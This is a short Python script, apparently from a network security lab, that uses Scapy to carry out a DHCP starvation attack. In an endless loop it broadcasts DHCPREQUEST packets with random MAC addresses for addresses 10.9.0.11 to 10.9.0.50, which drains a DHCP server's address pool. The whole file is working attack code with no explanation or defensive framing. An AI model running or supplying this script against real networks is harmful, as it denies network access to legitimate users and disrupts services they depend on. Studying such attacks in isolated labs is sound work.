from time import sleep
from scapy.all import *

while(1):
    i = 0
    for i in range(0,41): #Range from 0 till 40 
        if i == 0:
            continue
        
        req_ip_addr = "10.9.0."+str(10 + i) ## IP Adresses between 10.9.0.11 - 10.9.0.50

        mac_address = RandMAC()

        pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")\
            /IP(src="0.0.0.0", dst="255.255.255.255")\
            /UDP(sport=68, dport=67)\
            /BOOTP(chaddr=mac_address)\
            /DHCP(options=[("message-type", "request"),("requested_addr", req_ip_addr),("server_id", "10.9.0.1"),"end"])

        sendp(pkt)
        print ("DHCPREQUEST for:" + req_ip_addr)
        sleep(2)